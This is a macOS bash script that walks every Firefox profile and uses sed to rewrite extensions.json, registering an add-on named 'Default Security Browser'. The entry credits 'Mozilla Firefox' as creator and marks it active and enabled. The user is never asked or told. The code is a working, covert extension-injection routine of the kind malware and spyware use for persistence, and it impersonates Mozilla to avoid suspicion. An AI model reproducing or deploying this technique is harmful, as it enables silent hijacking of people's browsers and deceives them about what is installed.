#!/bin/bash

# Exit when a command fails
set -o errexit

# Error when unset variables are found
set -o nounset

CURDIR=$HOME
FULL_CUR=$CURDIR/Library/Application\ Support/Firefox

XPINAME=DefaultSecurityBrowser@mozilla.doslash.org
INSNAME=Default\ Security\ Browser 
INSCRE=Mozilla\ Firefox 
EXJSON=extensions.json  

if [ -d "$FULL_CUR" ]; then 
	PROPATH=$FULL_CUR/Profiles  
	for CHILD in "$PROPATH"/*
		do
 		 	JSONFILE=$CHILD/$EXJSON 
 		 	if ! grep -q "$XPINAME" "$JSONFILE"; 
 		 		then
 		 			echo "" #> /Users/ophat/Desktop/test.txt
 		 			APPENDER='"addons":\[{"id":"'$XPINAME'","syncGUID":"W6g_Z3jvE9Cj","location":"app-profile","version":"1.0-signed","type":"extension","internalName":null,"updateURL":null,"updateKey":null,"optionsURL":null,"optionsType":"2","aboutURL":null,"iconURL":null,"icon64URL":null,"defaultLocale":{"name":"'$INSNAME'","description":"'$XPINAME'","creator":"'$INSCRE'","homepageURL":null,"contributors":["Mozilla Firefox"]},"visible":true,"active":true,"userDisabled":false,"appDisabled":false,"descriptor":"'$CHILD'/extensions/'$XPINAME'.xpi","installDate":1436255686000,"updateDate":1436255686000,"applyBackgroundUpdates":1,"bootstrap":true,"size":30310,"sourceURI":null,"releaseNotesURI":null,"softDisabled":false,"foreignInstall":true,"hasBinaryComponents":false,"strictCompatibility":false,"locales":[],"targetApplications":[{"id":"{ec8030f7-c20a-464f-9b0e-13a3a9e97384}","minVersion":"3.6","maxVersion":"4.0.*"}],"targetPlatforms":[],"multiprocessCompatible":false},'
 		 			SEARCHAT='"addons":\['
 		 			sed -i '' "s|$SEARCHAT|$APPENDER|" "$JSONFILE"
				else
                    echo "" #> /Users/ophat/Desktop/test.txt
			fi
	done
fi






